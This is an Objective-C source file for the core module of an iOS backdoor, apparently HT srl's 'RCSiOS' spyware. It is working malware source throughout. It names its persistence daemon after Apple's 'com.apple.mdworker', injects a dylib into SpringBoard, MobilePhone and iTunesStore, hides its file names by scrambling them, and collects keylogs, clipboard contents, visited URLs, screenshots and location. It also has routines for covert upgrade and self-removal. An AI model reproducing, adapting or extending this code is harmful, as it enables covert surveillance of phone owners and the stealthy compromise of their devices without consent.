/*
 * RCSiOS - Core
 *
 * Created on 07/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <CommonCrypto/CommonDigest.h>
#import <unistd.h>
#import <sys/ioctl.h>
#import <fcntl.h>
#import <sys/socket.h>
#import <sys/un.h>
#import <mach/message.h>
#import <AudioToolbox/AudioToolbox.h>

#import "RCSICore.h"
#import "RCSIUtils.h"
#import "RCSICommon.h"
#import "RCSILogManager.h"
#import "RCSITaskManager.h"
#import "RCSIEncryption.h"
#import "RCSIInfoManager.h"
#import "RCSIActionManager.h"
#import "RCSIConfManager.h"
#import "RCSIAgentManager.h"

#import "NSString+ComparisonMethod.h"
#import "NSData+SHA1.h"

//#define DEBUG_
//#define __DEBUG_IOS_DYLIB

#pragma mark -
#pragma mark Private Interface
#pragma mark -

extern kern_return_t injectDylibToProc(pid_t pid, const char *path);

@interface RCSICore (hidden)

- (void)_guessNames;

- (BOOL)makeBackdoorResident;
- (BOOL)isBackdoorAlreadyResident;
- (BOOL)shouldUpgradeComponents;
- (BOOL)amIAlone;

- (void)resetStatus:(UInt32)aStatus;
- (void)setStatus:(UInt32)aStatus;
- (BOOL)modulesAlreadyRestarting;

@end

#pragma mark -
#pragma mark Private Implementation
#pragma mark -

@implementation RCSICore (hidden)

- (void)launchCtl:(char*)aDaemon command:(char*)aCommand
{
  char statment[256];
  
  snprintf(statment, 
           sizeof(statment), 
           "/bin/launchctl %s %s", 
           aCommand, 
           aDaemon);
  
  system(statment);
}

- (BOOL)createLaunchAgentPlist
{
  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity:1];
  
  NSDictionary *innerDict = 
    [[NSDictionary alloc] initWithObjectsAndKeys:
         @"com.apple.mdworker", @"Label",
         [NSNumber numberWithBool: TRUE], @"KeepAlive",
         [NSNumber numberWithInt: 3], @"ThrottleInterval",
         [[NSBundle mainBundle] bundlePath], @"WorkingDirectory",
         [NSArray arrayWithObjects: [[NSBundle mainBundle] executablePath], nil], @"ProgramArguments", 
         nil];
  
  [rootObj addEntriesFromDictionary: innerDict];
  
  [innerDict release];
  
  return [rootObj writeToFile: BACKDOOR_DAEMON_PLIST atomically: NO];
}

- (BOOL)isDaemonPlistInjected:(NSString*)pathName
{
  NSData *plistData = [[NSFileManager defaultManager] contentsAtPath: pathName];
  
  if (plistData == nil)
      return NO;
  
  NSMutableDictionary *plistDict = 
  (NSMutableDictionary *)[NSPropertyListSerialization propertyListFromData: plistData 
                                                          mutabilityOption: NSPropertyListMutableContainersAndLeaves 
                                                                    format: nil  
                                                          errorDescription: nil];
  
  if (plistDict == nil)
    return NO;
  
  NSMutableDictionary *plistEnvDict = (NSMutableDictionary *)[plistDict objectForKey: @"EnvironmentVariables"];
  
  if (plistEnvDict == nil) 
    {
      return FALSE;
    }
  else 
    {
      NSString *envObjIn  = (NSString *) [plistEnvDict objectForKey: @"DYLD_INSERT_LIBRARIES"];
      
      if (envObjIn == nil) 
        {
          return FALSE;
        }
      else 
        {
          NSRange sbRange;
          sbRange = [envObjIn rangeOfString: gDylibName options: NSCaseInsensitiveSearch]; 
        
          if (sbRange.location == NSNotFound)
            return FALSE;
          else
            return TRUE;
        }
    }
}

- (BOOL)makeBackdoorResident
{   
  if ([self isDaemonPlistInjected: SB_PATHNAME] == TRUE)
    return TRUE;
  
  // Dylib injection
  if (injectDylib(SB_PATHNAME) == YES)
    {
      [self launchCtl: SPRINGBOARD_PLIST_PATH command: "unload"];
      usleep(500000);
      [self launchCtl: SPRINGBOARD_PLIST_PATH command: "load"];
    }
  
  if (injectDylib(IT_PATHNAME) == YES) 
    {
      [self launchCtl: ITUNESSTORE_PLIST_PATH command: "unload"];
      usleep(500000);
      [self launchCtl: ITUNESSTORE_PLIST_PATH command: "load"];
    }
  
  return TRUE;
}

- (BOOL)isBackdoorAlreadyResident
{
  if ([[NSFileManager defaultManager] fileExistsAtPath:BACKDOOR_DAEMON_PLIST
                                           isDirectory:NULL])
    return YES;
  else
    return NO;
}

- (BOOL)updateDylibConfigId
{
  RCSIDylibBlob *tmpBlob = [[RCSIDylibBlob alloc] initWithType:DYLIB_NEW_CONFID 
                                                        status:1 
                                                    attributes:0 
                                                          blob:nil
                                                      configId:[[RCSIConfManager sharedInstance] mConfigTimestamp]];
  
  [[RCSISharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
  
  return TRUE;
}

- (BOOL)uninstallExternalModules
{  
  NSData *dylibName = [gDylibName dataUsingEncoding:NSUTF8StringEncoding];
  
  RCSIDylibBlob *tmpBlob = [[RCSIDylibBlob alloc] initWithType:DYLIB_NEED_UNINSTALL 
                                                        status:1 
                                                    attributes:0 
                                                          blob:dylibName
                                                      configId:0];
  
  [[RCSISharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
    
  return TRUE;
}

- (void)uninstallMeh
{
  NSString *sbPathname = @"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist";
  NSString *itPathname = @"/System/Library/LaunchDaemons/com.apple.itunesstored.plist";
  NSString *dylibPathname = 
  [[NSString alloc] initWithFormat: @"%@/%@", @"/usr/lib", gDylibName];
  
  [self uninstallExternalModules];
  
  removeDylibFromPlist(sbPathname);
  removeDylibFromPlist(itPathname);
  
  [self launchCtl: ITUNESSTORE_PLIST_PATH command: "unload"];
  [self launchCtl: ITUNESSTORE_PLIST_PATH command: "load"];
  
  [[NSFileManager defaultManager] removeItemAtPath: dylibPathname
                                             error: nil];
  [[NSFileManager defaultManager] removeItemAtPath: [[NSBundle mainBundle] bundlePath]
                                             error: nil];
  
  if (mLockSock != -1)
    close(mLockSock);
    
  [[NSFileManager defaultManager] removeItemAtPath: BACKDOOR_DAEMON_PLIST
                                             error: nil];
    
  checkAndRunDemoMode();
  
  sleep(1);
  
  [self launchCtl: "com.apple.mdworker" command: "remove"];
  
  [dylibPathname release];
  
  exit(0);
}

- (BOOL)shouldUpgradeComponents
{
  NSString *migrationConfig = [[NSString alloc] initWithFormat: @"%@/%@",
                               [[NSBundle mainBundle] bundlePath],
                               RCS8_MIGRATION_CONFIG];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: migrationConfig] == TRUE)
    {  
      NSString *configurationPath = [[NSString alloc] initWithFormat: @"%@/%@",
                                     [[NSBundle mainBundle] bundlePath],
                                     gConfigurationName];
      
      if ([[NSFileManager defaultManager] removeItemAtPath: configurationPath
                                                     error: nil])
        { // FIXED- corregere su mac!!!!!! XXX-
          [[NSFileManager defaultManager] moveItemAtPath: migrationConfig
                                                  toPath: configurationPath
                                                   error: nil];
        }
      
      [configurationPath release];
    }
  
  [migrationConfig release];
  
  NSString *updateDylib = [[NSString alloc] initWithFormat: @"%@/%@",
                           [[NSBundle mainBundle] bundlePath],
                           RCS8_UPDATE_DYLIB];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: updateDylib] == TRUE)
    
    {
      NSString *dylib = [[NSString alloc] initWithFormat: @"/usr/lib/%@", gDylibName];
    
      [[NSFileManager defaultManager] removeItemAtPath: dylib
                                                 error: nil];
    
      [[NSFileManager defaultManager] moveItemAtPath: updateDylib
                                              toPath: dylib
                                               error: nil];
      [dylib release];                                   
    
      // Forcing a SpringBoard reload
      [self launchCtl:SPRINGBOARD_PLIST_PATH command:"unload"];
      usleep(500000);
      [self launchCtl:SPRINGBOARD_PLIST_PATH command:"load"];
    }
  
  [updateDylib release];
  
  return TRUE;
}

- (BOOL)amIAlone
{
  // Lock to prevent more instance of running backdoor
  if ((mLockSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) != -1) 
    {
      struct sockaddr_in l_addr;   
      
      memset(&l_addr, 0, sizeof(l_addr));
      l_addr.sin_family       = AF_INET;
      l_addr.sin_port         = htons(37173);
      l_addr.sin_addr.s_addr  = inet_addr("127.0.0.1");
      
      if ((bind(mLockSock, (struct sockaddr *)&l_addr, sizeof(l_addr)) == -1) && 
          errno == EADDRINUSE) 
        {
          return NO;
        }
    }
  
  return YES;
}

- (void)_guessNames
{
  NSData *temp = [NSData dataWithBytes: gConfAesKey
                                length: CC_MD5_DIGEST_LENGTH];
  
  RCSIEncryption *_encryption = [[RCSIEncryption alloc] initWithKey: temp];
  gBackdoorName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
  
  gBackdoorUpdateName = [_encryption scrambleForward: gBackdoorName
                                                seed: ALPHABET_LEN / 2];
  
  if ([gBackdoorName isLessThan: gBackdoorUpdateName])
    {
      gConfigurationName = [_encryption scrambleForward: gBackdoorName 
                                                   seed: 1];
    }
  else
    {
      gConfigurationName = [_encryption scrambleForward: gBackdoorUpdateName 
                                                   seed: 1];
    }
  
  gConfigurationUpdateName = [_encryption scrambleForward: gConfigurationName  
                                                     seed: ALPHABET_LEN / 2];
  
  gDylibName = [_encryption scrambleForward: gConfigurationName 
                                       seed: 2];
  
  gCurrInstanceIDFileName = [_encryption scrambleForward: gBackdoorName
                                            seed: 10];
}

#pragma mark -
#pragma mark Message handling
#pragma mark -

typedef struct _coreMessage_t
{
  mach_msg_header_t header;
  uint dataLen;
} coreMessage_t;

- (void)refreshRemoteBlobs:(NSData*)aMessage
{
  shMemoryLog *message = (shMemoryLog *)[aMessage bytes];
  [[RCSISharedMemory sharedInstance] refreshRemoteBlobsToPid: message->flag];
}

- (void)dispatchToLogManager:(NSData*)aMessage
{
  if (aMessage != nil) 
    {
      mach_port_t machPort = 
          [[[RCSILogManager sharedInstance] notificationPort] machPort];
      [RCSISharedMemory sendMessageToMachPort:machPort withData:aMessage];
    }
}

- (void)dispatchToEventManager:(NSData*)aMessage
{
  if (aMessage != nil) 
    {
      mach_port_t machPort = [[eventManager notificationPort] machPort];
      [RCSISharedMemory sendMessageToMachPort:machPort withData:aMessage];
    }
}

- (void)dispatchToActionManager:(NSData*)aMessage
{
  if (aMessage != nil) 
    {
      mach_port_t machPort = [[actionManager notificationPort] machPort];
      [RCSISharedMemory sendMessageToMachPort:machPort withData:aMessage];
    }
}

- (void)dispatchToAgentManager:(NSData*)aMessage
{
  if (aMessage != nil) 
    {
      mach_port_t machPort = [[agentManager notificationPort] machPort];
      [RCSISharedMemory sendMessageToMachPort:machPort withData:aMessage];
    }
}

- (void)broadcastUninstall
{
  shMemoryLog reload;
  reload.agentID  = CORE_NOTIFICATION;
  reload.flag     = CORE_NEED_STOP;
  
  NSData *msgData = [[NSData alloc] initWithBytes: &reload 
                                           length:sizeof(shMemoryLog)];
  [self dispatchToEventManager:  msgData];
  [self dispatchToActionManager: msgData];
  [self dispatchToAgentManager:  msgData];
}

- (void)manageCoreNotification:(uint)aFlag
                   withMessage:(NSData*)aMessage
{
  if (aFlag == CORE_NEED_RESTART && 
      [self modulesAlreadyRestarting] == FALSE)
    {
      [self dispatchToEventManager:  aMessage];
      [self dispatchToActionManager: aMessage];
      [self dispatchToAgentManager:  aMessage];
    
      [self updateDylibConfigId];
    
      [self setStatus: CORE_STATUS_RELOAD];
    }
  else if (aFlag == CORE_ACTION_STOPPED)
    {
      [self resetStatus: CORE_STATUS_AM_RUN];
    }
  else if (aFlag == CORE_EVENT_STOPPED)
    {
      [self resetStatus:  CORE_STATUS_EM_RUN];
    }
  else if (aFlag == CORE_AGENT_STOPPED)
    {
      [self resetStatus:  CORE_STATUS_MM_RUN];
    }
  else if (aFlag == ACTION_DO_UNINSTALL)
    {
      [self setStatus: CORE_STATUS_STOPPING];
      [self broadcastUninstall];
    }
}

- (void)dispatchMessages:(NSData*)aMessage
{
  if (aMessage == nil)
    return;
    
  shMemoryLog *message = (shMemoryLog *)[aMessage bytes];
  
  switch (message->agentID)
  {
    case EVENT_SIM_CHANGE:
    case EVENT_TRIGGER_ACTION:
    {
      if ([self modulesAlreadyRestarting] == FALSE)
        [self dispatchToActionManager: aMessage];
      break;
    }
    case ACTION_START_AGENT:
    case ACTION_STOP_AGENT:
    {
      if ([self modulesAlreadyRestarting] == FALSE)
        [self dispatchToAgentManager: aMessage];
      break;
    }
    case ACTION_EVENT_ENABLED:
    case ACTION_EVENT_DISABLED:
    case EVENT_STANDBY:
    case EVENT_CAMERA_APP:
    {
      if ([self modulesAlreadyRestarting] == FALSE)
        [self dispatchToEventManager: aMessage];
      break;
    }
    case LOG_URL:
    case LOG_APPLICATION:
    case LOG_CLIPBOARD:
    case LOG_KEYLOG:
    case LOG_SNAPSHOT:
    case LOGTYPE_LOCATION_NEW:
    {
      [self dispatchToLogManager:aMessage];
      break;
    }
    case CORE_NOTIFICATION:
    {
      [self manageCoreNotification:message->flag 
                       withMessage:aMessage];
      break;
    }
    case DYLIB_CONF_REFRESH:
    {
      [self refreshRemoteBlobs:aMessage];
      break;
    }
  }
}

- (int)processIncomingMessages
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableArray *messages = [[RCSISharedMemory sharedInstance] fetchMessages];
  
  int msgCount = [messages count];
  
  for (int i=0; i < msgCount; i++) 
    [self dispatchMessages: [messages objectAtIndex:i]];
  
  [pool release];
  
  return msgCount;
}

#pragma mark -
#pragma mark Modules management
#pragma mark -

- (void)setStatus:(UInt32)aStatus
{
  moduleStatus |= aStatus;
}

- (void)resetStatus:(UInt32)aStatus
{
  moduleStatus &= ~(aStatus);
}

- (BOOL)modulesAlreadyRestarting
{
  if (!(moduleStatus & CORE_STATUS_STOPPING) && 
      ((moduleStatus & CORE_STATUS_RELOAD) == 0))
    return FALSE;
  else
    return TRUE;
}

- (BOOL)startEventManager
{
  [eventManager release];
  
  eventManager = [[RCSIEventManager alloc] init];

  if ([eventManager start] == TRUE)
    {
      [self setStatus: CORE_STATUS_EM_RUN];
      return TRUE;
    }
  else 
    return FALSE;
}

- (BOOL)startActionManager
{
  [actionManager release];
  
  actionManager = [[RCSIActionManager alloc] init];
  
  if ([actionManager start] == TRUE)
    {  
      [self setStatus: CORE_STATUS_AM_RUN];
      return TRUE;
    }
  else
    return FALSE;
}

- (BOOL)startAgentManager
{
  [agentManager release];
  
  agentManager = [[RCSIAgentManager alloc] init];
  
  if ([agentManager start] == TRUE)
    {  
      [self setStatus: CORE_STATUS_MM_RUN];
      return TRUE;
    }
  else
    return FALSE;
}

- (BOOL)shouldRestartModules
{
  BOOL retVal = FALSE;
  
  if ((moduleStatus  & CORE_STATUS_RELOAD) &&
      ((moduleStatus & CORE_STATUS_MDLS_BITS) == CORE_STATUS_MDLS_ALL_STOPPED))
    retVal = TRUE;
  
  return retVal;
}

- (BOOL)shouldStopCore
{
  BOOL retVal = FALSE;
  
  if ((moduleStatus  & CORE_STATUS_STOPPING) &&
      ((moduleStatus & CORE_STATUS_MDLS_BITS) == CORE_STATUS_MDLS_ALL_STOPPED))
    retVal = TRUE;
  
  return retVal;
}

#pragma mark -
#pragma mark Main runloop
#pragma mark -

- (BOOL)checkAndinjectSB
{
  BOOL bRet = TRUE;
  char dylibname[256];
  char dylbPathname[256];
  
  if ([self isDaemonPlistInjected: SB_PATHNAME] == TRUE)
    return TRUE;
  
  pid_t sb_pid = getPidByProcessName(@"SpringBoard");
  pid_t mp_pid = getPidByProcessName(@"MobilePhone");
  
  if (sb_pid > 0 &&  sb_pid != mSBPid) 
    {
      mSBPid = sb_pid;

      [gDylibName getCString: dylibname maxLength: 256 encoding:NSUTF8StringEncoding];
      snprintf(dylbPathname, sizeof(dylbPathname), "/usr/lib/%s", dylibname);
    
      if (injectDylibToProc(mSBPid, dylbPathname) == 0)
        bRet = TRUE;
      else
        bRet = FALSE;
      
      injectDylibToProc(mp_pid, dylbPathname);
    }
  
  return bRet;
}

/*
 * invoked by timer
 */
- (void)checkAndinjectSB:(NSTimer*)theTimer
{
  [self checkAndinjectSB];
}

- (void)injectSpringBoard
{
#ifdef __DEBUG_IOS_DYLIB
  return;
#endif
  
  if ([self checkAndinjectSB] == TRUE)
    {
      NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: 10.0 
                                                        target: self 
                                                      selector: @selector(checkAndinjectSB:) 
                                                      userInfo: nil 
                                                       repeats: YES];
      
      [[NSRunLoop currentRunLoop] addTimer: timer forMode: NSRunLoopCommonModes];
      [timer release];
    }
  else
    {
      [self makeBackdoorResident];
    }
}

- (void)coreRunLoop
{ 
  // singleton object with the correct names of files
  RCSIConfManager *configManager = [[RCSIConfManager alloc] initWithBackdoorName:
                                    [[[NSBundle mainBundle] executablePath] lastPathComponent]];
  
  if ([configManager checkConfiguration] == NO)
    exit(-1);
  
  // sound/vibrate in demo mode
  checkAndRunDemoMode();
  
  RCSILogManager  *logManager = [RCSILogManager sharedInstance];
  [logManager start];
  
  createInfoLog(@"Start");
  
  [self injectSpringBoard];
  
  /*
   * enable main runloop for battery notification
   */
  [[UIDevice currentDevice] setBatteryMonitoringEnabled:YES];
  
  while ([self mMainLoopControlFlag] != CORE_STOPPED)
    {
      NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
          
      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: 0.750]]; 

      [self processIncomingMessages];
    
      // first run and every new conf received
      if ([self shouldRestartModules] == TRUE)
        {
          [[RCSISharedMemory sharedInstance] delBlobs];
        
          if ([self startAgentManager]  == TRUE &&
              [self startActionManager] == TRUE && 
              [self startEventManager]  == TRUE)
            {
              [self resetStatus: CORE_STATUS_RELOAD];
            }
          else
            {
              exit(-1);
            }
        }
      else if ([self shouldStopCore] == TRUE)
        {
          // all modules flags are resetted
          //    -> modulesStatus = CORE_STOPPING_STAT
          [self setMMainLoopControlFlag: CORE_STOPPED];
        }
    
      [pool release];
    }
  
  // clean all and exit
  [self uninstallMeh];
}

@end

#pragma mark -
#pragma mark Public Implementation
#pragma mark -

@implementation RCSICore

@synthesize mMainLoopControlFlag;
@synthesize mUtil;
@synthesize mSBPid;

- (id)init
{
  self = [super init];
  
  if (self != nil)
    {
      mMainLoopControlFlag  = CORE_RUNNING;
      moduleStatus          = CORE_STATUS_RELOAD;
      eventManager          = nil;
      actionManager         = nil;
      agentManager          = nil;
      mLockSock             = -1;
      mSBPid                = -1;
    
      [self _guessNames];
   
      mUtil = [[RCSIUtils alloc] initWithBackdoorPath: [[NSBundle mainBundle] bundlePath]];
    }
  
  return self;
}

- (void)dealloc
{
  [mUtil release];
  [super dealloc];
}

- (BOOL)runMeh
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if ([self amIAlone] == NO)
    {
      [pool release];
      exit(-1);
    } 
    
  getSystemVersion(&gOSMajor, &gOSMinor, &gOSBugFix);

  [self shouldUpgradeComponents];

  [[RCSISharedMemory sharedInstance] createCoreRLSource];
  
  if ([self isBackdoorAlreadyResident] == FALSE)
      [self createLaunchAgentPlist];

  [self coreRunLoop];
  
  [pool release];
  
  return YES;
}

@end


